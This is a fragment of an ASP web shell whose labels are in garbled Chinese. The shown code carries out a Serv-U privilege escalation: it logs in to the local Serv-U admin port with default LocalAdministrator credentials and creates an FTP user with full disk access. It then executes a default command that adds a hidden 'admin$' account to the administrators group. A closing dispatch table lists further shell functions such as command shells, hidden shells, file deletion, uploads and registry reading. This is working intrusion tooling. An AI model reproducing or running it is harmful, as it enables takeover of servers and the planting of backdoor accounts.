if  not isnumeric(SUaction) then response.end
user = trim(request("u"))
pass = trim(request("p"))
port = trim(request("port"))
cmd = trim(request("c"))
f=trim(request("f"))
if f="" then
f=gpath()
else
f=left(f,2)
end if
ftpport = 65500
timeout=3
loginuser = "User " & user & vbCrLf
loginpass = "Pass " & pass & vbCrLf
deldomain = "-DELETEDOMAIN" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & " PortNo=" & ftpport & vbCrLf
mt = "SITE MAINTENANCE" & vbCrLf
newdomain = "-SETDOMAIN" & vbCrLf & "-Domain=goldsun|0.0.0.0|" & ftpport & "|-1|1|0" & vbCrLf & "-TZOEnable=0" & vbCrLf & " TZOKey=" & vbCrLf
newuser = "-SETUSERSETUP" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & "-PortNo=" & ftpport & vbCrLf & "-User=go" & vbCrLf & "-Password=od" & vbCrLf & _
        "-HomeDir=c:\\" & vbCrLf & "-LoginMesFile=" & vbCrLf & "-Disable=0" & vbCrLf & "-RelPaths=1" & vbCrLf & _
        "-NeedSecure=0" & vbCrLf & "-HideHidden=0" & vbCrLf & "-AlwaysAllowLogin=0" & vbCrLf & "-ChangePassword=0" & vbCrLf & _
        "-QuotaEnable=0" & vbCrLf & "-MaxUsersLoginPerIP=-1" & vbCrLf & "-SpeedLimitUp=0" & vbCrLf & "-SpeedLimitDown=0" & vbCrLf & _
        "-MaxNrUsers=-1" & vbCrLf & "-IdleTimeOut=600" & vbCrLf & "-SessionTimeOut=-1" & vbCrLf & "-Expire=0" & vbCrLf & "-RatioUp=1" & vbCrLf & _
        "-RatioDown=1" & vbCrLf & "-RatiosCredit=0" & vbCrLf & "-QuotaCurrent=0" & vbCrLf & "-QuotaMaximum=0" & vbCrLf & _
        "-Maintenance=System" & vbCrLf & "-PasswordType=Regular" & vbCrLf & "-Ratios=None" & vbCrLf & " Access=c:\\|RWAMELCDP" & vbCrLf
quit = "QUIT" & vbCrLf
newuser=replace(newuser,"c:",f)
select case SUaction
case 1
set a=Server.CreateObject("Microsoft.XMLHTTP")
a.open "GET", "http://127.0.0.1:" & port & "/goldsun/upadmin/s1",True, "", ""
a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit
set session("a")=a
j"<form method='post' name='goldsun'>"
j"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
j"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
j"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
j"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
j"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
j"<input name='SUaction' type='hidden' id='SUaction' value='2'></form>"
j"<script language='javascript'>"
j"document.write('<center>�������� 127.0.0.1:"&port&",ʹ���û���: "&user&",���"&pass&"...<center>');"
j"setTimeout('document.all.goldsun.submit();',4000);"
j"</script>"
case 2
set b=Server.CreateObject("Microsoft.XMLHTTP")
b.open "GET", "http://127.0.0.1:" & ftpport & "/goldsun/upadmin/s2", True, "", ""
b.send "User go" & vbCrLf & "pass od" & vbCrLf & "site exec " & cmd & vbCrLf & quit
set session("b")=b
j"<form method='post' name='goldsun'>"
j"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
j"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
j"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
j"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
j"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
j"<input name='SUaction' type='hidden' id='SUaction' value='3'></form>"
j"<script language='javascript'>"
j"document.write('<center>��������Ȩ��,��ȴ�...,<center>');"
j"setTimeout(""document.all.goldsun.submit();"",4000);"
j"</script>"
case 3
set c=Server.CreateObject("Microsoft.XMLHTTP")
a.open "GET", "http://127.0.0.1:" & port & "/goldsun/upadmin/s3", True, "", ""
a.send loginuser & loginpass & mt & deldomain & quit
set session("a")=a
j"<center>��Ȩ���,��ִ��������,�ɹ������ο���Ʒ��<br><font color=red>"&cmd&"</font><br><br>"
j"<input type=button value=' ���ؼ��� ' onClick=""location.href='?Action=Servu';"">"
j"</center>"
case else
on error resume next
set a=session("a")
set b=session("b")
set c=session("c")
a.abort
Set a = Nothing
b.abort
Set b = Nothing
c.abort
Set c = Nothing
j"<center><form method='post' name='goldsun'>"
j"<table width='494' height='163' border='1' cellpadding='0' cellspacing='1' bordercolor='#666666'>"
j"<tr align='center' valign='middle'>"
j"<td colspan='2'>Serv-U ����Ȩ�� by Sam</td>"
j"</tr>"
j"<tr align='center' valign='middle'>"
j"<td width='100'>�û���:</td>"
j"<td width='379'><input name='u' type='text' id='u' value='LocalAdministrator'></td>"
j"</tr>"
j"<tr align='center' valign='middle'>"
j"<td>�� �</td>"
j"<td><input name='p' type='text' id='p' value='#l@$ak#.lk;0@P'></td>"
j"</tr>"
j"<tr align='center' valign='middle'>"
j"<td>�� �ڣ�</td>"
j"<td><input name='port' type='text' id='port' value='43958'></td>"
j"</tr>"
j"<tr align='center' valign='middle'>"
j"<td>ϵͳ·����</td>"
j" <td><input name='f' type='text' id='f' value='"&f&"' size='8'></td>"
j" </tr>"
j" <tr align='center' valign='middle'>"
j" <td>�����</td>"
j" <td><input name='c' type='text' id='c' value='cmd /c net user admin$ 123456 /add & net localgroup administrators admin$ /add' size='50'></td>"
j" </tr>"
j" <tr align='center' valign='middle'>"
j" <td colspan='2'><input type='submit' name='Submit' value='�ύ'> "
j"<input type='reset' name='Submit2' value='����'>"
j"<input name='SUaction' type='hidden' id='action' value='1'></td>"
j"</tr></table></form></center>"
end select
function Gpath()
on error resume next
err.clear
set f=Server.CreateObject(CONST_FSO)
if err.number>0 then
gpath="c:"
exit function
end if
gpath=f.GetSpecialFolder(0)
gpath=lcase(left(gpath,2))
set f=nothing
end function
case"MMD":MMD()
case"ReadREG":call ReadREG()
case"delpoint":call delpoint()
case"Show1File":Set ABC=New LBF:ABC.Show1File(Session("FolderPath")):Set ABC=Nothing
case"DownFile":DownFile FName:ShowErr()
case"DelFile":Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing
case"EditFile":Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing
case"CopyFile":Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing
case"MoveFile":Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing
case"DelFolder":Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing
case"CopyFolder":Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing
case"MoveFolder":Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing
case"NewFolder":Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing
case"UpFile":UpFile()
case"TSearch":TSearch()
case"pcanywhere4":pcanywhere4()
case"Cmd1Shell":Cmd1Shell()
case"Logout":Session.Contents.Remove("kkk"):Response.Redirect URL
case"Course":Course()
case"Alexa":Alexa()
case"suftp":suftp()
case"upload":upload()
case"radmin":radmin()
case"pcanywhere4":pcanywhere4()
case"goback":goback()
Case "ProFile":ProFile()
case"php":php()
case"apjdel":apjdel()
case"cmdx":cmdx()
case"aspx":aspx()
case"hiddenshell":hiddenshell()
case"ScanDriveForm" : ScanDriveForm
Case "CustomScanDriveForm":CustomScanDriveForm()
case"ScanDrive" : ScanDrive Request("Drive")
case"ScFolder"  : ScFolder Request("Folder")
  Case Else MainForm()
End Select
if Action<>"Servu" then ShowErr()
j"</body></html>"%>